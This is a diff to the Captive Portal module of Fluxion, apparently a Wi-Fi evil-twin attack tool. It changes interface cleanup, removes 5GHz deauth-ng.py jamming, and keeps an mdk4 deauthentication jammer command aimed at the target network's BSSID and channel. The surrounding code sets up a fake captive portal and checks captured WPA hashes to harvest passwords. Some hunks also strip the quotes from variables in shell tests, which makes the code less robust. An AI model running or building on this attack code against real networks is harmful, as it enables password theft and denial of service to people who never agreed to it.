@@ -19,10 +19,16 @@ CaptivePortalGatewayNetwork=${CaptivePortalGatewayAddress%.*}
 # ============== < Captive Portal Subroutines > ============== #
 # ============================================================ #
 captive_portal_unset_jammer_interface() {
-  CaptivePortalJammerInterfaceOriginal=""
+  if [ ! "$CaptivePortalJammerInterface" ]; then
+    CaptivePortalJammerInterfaceOriginal=""
+    return 1
+  fi
 
-  if [ ! "$CaptivePortalJammerInterface" ]; then return 1; fi
+  # Deallocate the interface from FluxionInterfaces so it can be reused.
+  fluxion_deallocate_interface "$CaptivePortalJammerInterface" 2>/dev/null
+
   CaptivePortalJammerInterface=""
+  CaptivePortalJammerInterfaceOriginal=""
 
   # Check if we're automatically selecting the interface & skip
   # this one if so to take the user back properly.
@@ -72,9 +78,10 @@ captive_portal_ap_interfaces() {
 }
 
 captive_portal_unset_ap_interface() {
-  CaptivePortalAccessPointInterfaceOriginal=""
-
-  if [ ! "$CaptivePortalAccessPointInterface" ]; then return 1; fi
+  if [ ! "$CaptivePortalAccessPointInterface" ]; then
+    CaptivePortalAccessPointInterfaceOriginal=""
+    return 1
+  fi
 
   # Check if it's a virtual interface (ends with 'v')
   if [[ "$CaptivePortalAccessPointInterface" == *v ]]; then
@@ -84,8 +91,13 @@ captive_portal_unset_ap_interface() {
         echo "Warning: Unable to remove virtual interface $CaptivePortalAccessPointInterface" > $FLUXIONOutputDevice
       fi
     fi
+  else
+    # Non-virtual: deallocate the interface from FluxionInterfaces so it can be reused.
+    fluxion_deallocate_interface "$CaptivePortalAccessPointInterface" 2>/dev/null
   fi
+
   CaptivePortalAccessPointInterface=""
+  CaptivePortalAccessPointInterfaceOriginal=""
 }
 
 captive_portal_set_ap_interface() {
@@ -311,19 +323,19 @@ captive_portal_set_authenticator() {
 
       CaptivePortalHashPath="${FluxionHashPath:-'INVALID_PATH'}"
 
-      if [ "$result" -eq 255 ] || [ "$result" -eq -1 ]; then
+      if [ $result -eq 255 ] || [ $result -eq -1 ]; then
         # User backed out; bubble up so caller can show previous menu.
         return -1
       fi
 
-      if [ "$result" -ne 0 ]; then
+      if [ $result -ne 0 ]; then
         echo "Failed to set a hash path!" > $FLUXIONOutputDevice
       fi
       ;;
   esac
 
   # Assure authentication method processing succeeded, abort otherwise.
-  if [ "$result" -ne 0 ]; then
+  if [ $result -ne 0 ]; then
     echo "Auth-mode error code $result!" > $FLUXIONOutputDevice
     return 1
   fi
@@ -1144,10 +1156,6 @@ captive_portal_generic() {
     </body>
 </html>" >"$FLUXIONWorkspacePath/captive_portal/index.html"
 
-if [ "$FLUXIONEnable5GHZ" -eq 1 ]; then
-    cp -r "$FLUXIONPath/attacks/Captive Portal/deauth-ng.py" "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
-    chmod +x "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py"
-fi
 
 }
 
@@ -1379,7 +1387,7 @@ load_attack() {
   # Target hash information for verification.
   local -r targetHashSSID=${configuration[8]}
   local -r targetHashMAC=${configuration[9]}
-
+  
   # Captive portal jammer type.
   CaptivePortalJammerType=${configuration[10]}
   option_deauth="${CaptivePortalJammerType}"
@@ -1412,7 +1420,7 @@ save_attack() {
   # Target to verify validity of hash on restore.
   echo "$FluxionTargetSSID" >> "$configurationPath"
   echo "$FluxionTargetMAC" >> "$configurationPath"
-
+  
   # Captive portal jammer type.
   CaptivePortalJammerType="${option_deauth}"
   echo "$CaptivePortalJammerType" >> "$configurationPath"
@@ -1438,11 +1446,7 @@ captive_portal_start_jammer_service() {
     sleep 1
   fi
 
-  if [ "$FLUXIONEnable5GHZ" -eq 1 ]; then
-    fluxion_window_open CaptivePortalJammerServiceXtermPID \
-      "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
-      "$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC"
-  elif [[ $option_deauth -eq 1 ]]; then
+  if [[ $option_deauth -eq 1 ]]; then
     fluxion_window_open CaptivePortalJammerServiceXtermPID \
       "FLUXION AP Jammer Service [$FluxionTargetSSID]" "$BOTTOMRIGHT" "black" "#FF0009" \
       "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\""
@@ -1495,13 +1499,13 @@ stop_attack() {
   #)
 
   # Signal any authenticator to stop authentication loop.
-  if [ "$skip_authenticator_kill" -eq 0 ]; then
+  if [ $skip_authenticator_kill -eq 0 ]; then
     # Kill the authenticator xterm window silently.
     if [ "$CaptivePortalAuthenticatorServiceXtermPID" ]; then
-      kill "$CaptivePortalAuthenticatorServiceXtermPID" &> /dev/null
+      kill $CaptivePortalAuthenticatorServiceXtermPID &> /dev/null
       CaptivePortalAuthenticatorServiceXtermPID=""
     fi
-
+    
     fluxion_kill_lineage "--signal SIGABRT" \
       "captive_portal_authenticator\\.sh" &> /dev/null
     pkill -9 -f "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" \
